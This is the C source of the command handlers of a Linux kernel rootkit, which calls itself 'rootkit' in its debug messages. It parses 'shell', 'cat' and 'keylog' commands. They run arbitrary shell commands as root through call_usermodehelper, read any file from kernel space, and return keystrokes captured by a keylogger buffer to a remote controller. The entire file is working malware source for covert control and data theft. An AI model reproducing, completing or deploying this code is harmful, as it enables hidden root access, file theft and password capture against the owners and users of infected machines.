#include "commands.h"


static u32 get_arg_len(char* string) {
    u32 index = 0;
    while (string[index] != ' ' && string[index] != '\0') {
        index++;
    }
    return index;
}


command_t parse_command(char* data)
{
    char* command_strings[COMMAND_NUM] = {"shell \0", "cat \0", "keylog\0"};
    command_t commands[COMMAND_NUM] = {RUN, CAT, KEYLOG};
    u32 i, shift, j;


    for (i = 0; i < COMMAND_NUM; i++) {

        shift = strlen(command_strings[i]);

        // checking if the string starts with the given command
        if (strncmp(data, command_strings[i], shift) != 0) {
            continue;
        }

        // shifting the string (to delete the command)
        j = shift;
        while (true) {
            data[j - shift] = data[j];
            if (data[j] == '\0') {
                break;
            }
            j++;
        }
        return commands[i];
        
        

    }


    return BAD_COMMAND;

}


void run_command(args_t* args) {
    char *argv[] = {"/bin/sh", "-c", args->string, NULL};
    char *envp[] = {"PATH=/bin:/sbin", NULL};

    DEBUG_PUTS("rootkit: performing bash command\n")

    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);

    send_response("rootkit: shell command was performed", args);

}


int read_file(char* filename, char* buffer, int to_read, loff_t start) {
    struct file *f;
    int i;
    loff_t offset = start;

    // initializing string with null symbols
    for (i = 0; i < to_read + 1; i++) {
        buffer[i] = '\0';
    }
    
    
    f = filp_open(filename, O_RDONLY, 0);

    if (IS_ERR(f)) {
        DEBUG_PUTS("rootkit: file was not open\n")
        return -1;
    }

    // TODO: check return value + dynamic allocation
    kernel_read(f, (void*) buffer, to_read, &offset);


    DEBUG_PRINTF("rootkit: file was read: %s\n", buffer)

    filp_close(f, NULL);
    
    return 0;


}


void cat_command(args_t* args) {
    char* string = args->string;
    u32 first_arg_len;
    u32 second_arg_len;
    u32 start_index;
    u32 count;
    char* buffer;

    first_arg_len = get_arg_len(string);
    if (string[first_arg_len] == '\0') {
        send_response("rootkit: cat got only one argument\0", args);
        return;
    }
    string[first_arg_len] = '\0';

    second_arg_len = get_arg_len(string + first_arg_len + 1);
    if (string[second_arg_len + first_arg_len + 1] == '\0') {
        send_response("rootkit: cat got only two arguments\0", args);
        return;
    }
    string[first_arg_len + second_arg_len + 1] = '\0';

    if (kstrtou32(string, 10, &start_index) != 0) {
        send_response("rootkit: cat got invalid start index\0", args);
        return;
    }

    DEBUG_PRINTF("rootkit: first_arg=%s", string)

    if (kstrtou32(string + first_arg_len + 1, 10, &count) != 0) {
        send_response("rootkit: cat got invalid count\0", args);
        return;
    }

    DEBUG_PRINTF("rootkit: second_arg=%s", string + first_arg_len + 1)

    if (count >= REQUEST_SIZE_LIMIT) {
        send_response("rootkit: too many bytes to read\0", args);
        return;
    }


    buffer = kmalloc(count + 1, GFP_KERNEL);
    
    DEBUG_PRINTF("rootkit: filename %s", string + first_arg_len + second_arg_len + 2)

    // checking errors
    if (read_file(string + first_arg_len + second_arg_len + 2, buffer, count, start_index) == 0) {   
        send_response(buffer, args);
    } else {
        send_response("rootkit: error while reading\0", args);
    }
    kfree(buffer);

}

void keylog_command(args_t* args) {
    char* buffer = kmalloc(KEYLOGGER_SIZE + 1, GFP_KERNEL);
    size_t j = 0;
    size_t i;

    mutex_lock(&keylogger_mutex);
    for (i = logger_index; i < KEYLOGGER_SIZE; i++) {
        buffer[j] = keylogger[i];
        j++;
    }
    for (i = 0; i < logger_index; i++) {
        buffer[j] = keylogger[i];
        j++;
    }
    buffer[j] = '\0';
    mutex_unlock(&keylogger_mutex);

    DEBUG_PUTS("rootkit: copied keylog\n")

    send_response(buffer, args);

    kfree(buffer);




}
